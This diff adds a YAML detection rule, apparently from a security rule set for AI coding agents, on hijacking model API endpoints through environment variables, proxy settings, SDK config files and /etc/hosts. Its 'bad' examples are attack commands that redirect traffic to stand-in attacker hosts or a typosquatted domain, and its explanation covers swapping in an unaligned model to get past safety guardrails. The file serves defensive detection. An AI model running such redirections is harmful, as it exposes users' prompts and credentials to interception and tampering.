@@ -1,0 +1,115 @@
+id: "supply-chain/config-tampering/model-endpoint-hijacking"
+version: "1.0.0"
+kingdom: "Supply Chain Compromise"
+kingdom_id: 7
+category: "Config Tampering"
+category_id: "7.2"
+name: "AI Model Endpoint Hijacking"
+risk_level: "critical"
+
+abstract: |
+  An attacker redirects an AI agent's inference API calls to an
+  attacker-controlled endpoint by manipulating environment variables
+  (OPENAI_BASE_URL, ANTHROPIC_BASE_URL, OLLAMA_HOST) or configuration files,
+  enabling man-in-the-middle interception of all prompts, responses, and
+  embedded credentials.
+
+explanation: |
+  AI coding agents communicate with language model APIs through configurable
+  endpoints. Most AI SDKs and tools support base URL overrides via environment
+  variables or configuration files, originally designed for proxying, local
+  development, or enterprise gateway routing. An attacker who can modify these
+  settings gains full visibility into the agent's communication channel:
+
+  - **Environment variable hijacking**: Setting OPENAI_BASE_URL,
+    ANTHROPIC_BASE_URL, AZURE_OPENAI_ENDPOINT, OLLAMA_HOST, or similar
+    variables to redirect API traffic. These variables are read by SDKs
+    before any request, making them a single point of compromise.
+  - **SDK configuration file manipulation**: Modifying .openai, .anthropic,
+    or framework-specific config files that specify API endpoints. These
+    files are often stored in the user's home directory with no integrity
+    protection.
+  - **Proxy configuration injection**: Setting HTTP_PROXY, HTTPS_PROXY, or
+    ALL_PROXY to route all API traffic through an attacker-controlled proxy
+    that can inspect and modify requests and responses.
+  - **Local model substitution**: Redirecting requests intended for a capable
+    model (GPT-4, Claude) to a weaker local model that lacks safety
+    guardrails, or to a fine-tuned model designed to produce malicious
+    outputs (jailbroken models, models trained to generate backdoored code).
+  - **DNS-level redirection**: Manipulating /etc/hosts or DNS configuration
+    to redirect API hostnames (api.openai.com, api.anthropic.com) to
+    attacker-controlled IP addresses.
+
+  The impact of successful endpoint hijacking includes:
+  1. **Full prompt visibility**: All system prompts, user instructions,
+     code context, and credentials sent to the model are captured.
+  2. **Response manipulation**: The attacker can modify model responses to
+     inject malicious code, disable safety recommendations, or alter the
+     agent's behavior.
+  3. **Credential harvesting**: API keys sent in Authorization headers are
+     captured and can be reused for direct API access.
+  4. **Safety bypass**: Redirecting to an unaligned model that will comply
+     with any request, bypassing the safety guardrails of the intended model.
+
+  Known environment variables at risk:
+  - OpenAI: OPENAI_BASE_URL, OPENAI_API_BASE
+  - Anthropic: ANTHROPIC_BASE_URL
+  - Azure: AZURE_OPENAI_ENDPOINT, AZURE_OPENAI_BASE_PATH
+  - Ollama: OLLAMA_HOST, OLLAMA_ORIGINS
+  - LiteLLM: LITELLM_PROXY_BASE_URL
+  - Generic: HTTP_PROXY, HTTPS_PROXY, ALL_PROXY, NO_PROXY
+
+  MITRE equivalent: T1557 (Adversary-in-the-Middle) combined with T1584.004
+  (Compromise Infrastructure: Server) adapted for AI inference pipelines.
+
+recommendation: |
+  - Monitor and alert on modifications to AI-related environment variables
+    (OPENAI_BASE_URL, ANTHROPIC_BASE_URL, OLLAMA_HOST, *_PROXY).
+  - Pin API endpoints in application configuration rather than relying on
+    environment variables that can be overridden.
+  - Implement certificate pinning for AI API endpoints to detect MITM
+    proxies and endpoint redirection.
+  - Block agent writes to /etc/hosts and DNS configuration files.
+  - Validate API endpoint hostnames against an allowlist before establishing
+    connections.
+  - Monitor for unexpected changes to proxy configuration (HTTP_PROXY,
+    HTTPS_PROXY) in agent sessions.
+  - Use API key rotation and short-lived tokens to limit the impact of
+    credential harvesting through hijacked endpoints.
+
+examples:
+  bad:
+    - "export OPENAI_BASE_URL=https://evil-proxy.attacker.com/v1"
+    - "export ANTHROPIC_BASE_URL=http://localhost:8080  # redirect to local attacker proxy"
+    - "echo 'OLLAMA_HOST=attacker.com:11434' >> .env"
+    - "export HTTPS_PROXY=http://mitm-proxy.attacker.com:8888"
+    - "echo '104.18.7.23 api.openai.com' >> /etc/hosts  # DNS-level redirect"
+    - "sed -i 's|api.anthropic.com|api.anthroplc.com|' ~/.config/claude/settings.json  # typosquatted domain"
+    - "export LITELLM_PROXY_BASE_URL=https://evil.com/proxy"
+  good:
+    - "echo $OPENAI_BASE_URL  # reading the variable is safe"
+    - "curl -I https://api.openai.com/v1/models  # checking connectivity to legitimate endpoint"
+    - "export OPENAI_BASE_URL=https://gateway.internal.corp.com/v1  # legitimate enterprise proxy with known IP"
+
+compliance:
+  owasp-llm-2025: ["LLM05", "LLM03"]
+  iso-27001-2022: ["A.8.9", "A.8.20", "A.8.25"]
+  eu-ai-act-2024: ["Art.9", "Art.15"]
+  nist-ai-rmf-1.0: ["GOVERN-6", "MAP-5", "MANAGE-1"]
+  soc2-type2: ["CC6.1", "CC6.6", "CC6.7"]
+
+references:
+  mitre_attack: ["T1557", "T1584.004", "T1090"]
+  cwe: ["CWE-295", "CWE-923", "CWE-350"]
+  external:
+    - title: "OWASP LLM05: Improper Output Handling"
+      url: "https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/"
+    - title: "OpenAI API Reference: Configuring Base URL"
+      url: "https://platform.openai.com/docs/api-reference"
+
+analyzers: ["regex", "structural", "semantic"]
+related_rules: []
+# Detection: Regex analyzer matches export/set commands targeting known AI
+# endpoint environment variables. Structural analyzer detects writes to
+# /etc/hosts, proxy config files, and AI SDK config files. Semantic analyzer
+# classifies API endpoint redirection intent.
